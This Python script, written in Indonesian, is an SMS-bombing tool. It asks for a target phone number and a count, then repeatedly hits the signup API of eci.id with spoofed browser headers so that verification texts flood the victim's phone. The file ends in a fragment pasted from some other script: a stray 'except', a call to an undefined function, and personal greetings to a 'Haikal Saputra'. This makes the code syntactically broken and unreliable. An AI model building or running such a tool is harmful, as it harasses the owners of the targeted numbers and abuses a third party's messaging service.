import os,sys,time,requests
from time import sleep

import os,sys,time,requests,json,random
from requests import post
from requests import get


k = 0
os.system("clear")
print("Spam Sms Unlimited ( Tak Terbatas )")
nomer = input("Masukan Nomer Target > ")
jumlah = int(input("Masukan Jumlah Spam > "))

TUTORIALGRATIS = {
"Host": "eci.id",
"Connection": "keep-alive",
"Content-Length": "27",
"Accept": "application/json, text/plain, */*",
"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
"Content-Type": "application/json",
"Origin": "https://eci.id",
"Sec-Fetch-Site": "same-origin",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://eci.id/register",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
QiinCreator= json.dumps({"identity":"0"+nomer})
for i in range(jumlah):
  k += 1
  pos = requests.post("https://eci.id/api/signup",headers=TUTORIALGRATIS,data=QiinCreator).text
  if "success" in pos:
    print("Spam Sms Berhasil ",k)
  else:
    print("Spam Sms Gagal ",k)
    
#-----------------------[ SYSTEM-CONTROL ]--------------------#
	except:pass
	alvino_xy(f'\n\t{x}——> {h} Selamat Datang Haikal Saputra\n\t{x}——> {h}Jangan Lupa Makan Dulu Ya Haikal Sayang\n\t{x}===== {h}Jaga Kesehatan  Selalu Yah Haikal\n\t{x}====== {h}Semoga Di Mudahkan Rezekinya Amin\n\t{x}====== {h}Semoga Harimu Menyenangkan Haikal Sayang\n\t{x}')
	time.sleep(3)
	login()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> Haikal Saputra XD <<<<<#